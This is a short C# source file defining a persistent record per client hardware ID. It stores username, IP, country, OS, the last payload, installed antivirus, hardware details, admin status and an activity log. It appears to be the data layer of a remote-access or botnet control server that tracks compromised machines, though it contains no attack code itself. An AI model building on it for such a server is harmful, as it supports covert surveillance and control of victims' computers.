namespace SeroServer.Data;

/// <summary>
/// Persistent record for every client HWID ever seen.
/// Survives server restarts. Stored in clients.json.
/// </summary>
public class ClientRecord
{
    public string Hwid { get; set; } = string.Empty;
    public string LastUsername { get; set; } = string.Empty;
    public string LastIP { get; set; } = string.Empty;
    public string LastCountry { get; set; } = string.Empty;
    public string LastMachineName { get; set; } = string.Empty;
    public string LastOS        { get; set; } = string.Empty;
    public string LastPayload   { get; set; } = string.Empty;
    public string LastAntivirus { get; set; } = string.Empty;
    public string LastCpuName   { get; set; } = string.Empty;
    public string LastGpuName   { get; set; } = string.Empty;
    public long   LastRamUsed   { get; set; }
    public long   LastRamTotal  { get; set; }
    public string LastRamDisplay => LastRamTotal > 0 ? $"{LastRamUsed}/{LastRamTotal} MB" : "—";
    public bool   LastIsAdmin   { get; set; }
    public int    LastPort { get; set; }
    public string Tag    { get; set; } = string.Empty;
    public bool   HasTag => !string.IsNullOrEmpty(Tag);
    public string AssignedId { get; set; } = string.Empty;
    public DateTime FirstSeen        { get; set; } = DateTime.UtcNow;
    public DateTime LastSeen         { get; set; } = DateTime.UtcNow;
    public DateTime LastConnectedAt  { get; set; } = DateTime.MinValue;
    public List<ActivityEntry> ActivityLog { get; set; } = [];
}

public class ActivityEntry
{
    public DateTime Time { get; set; } = DateTime.UtcNow;
    public string Action { get; set; } = string.Empty;
}
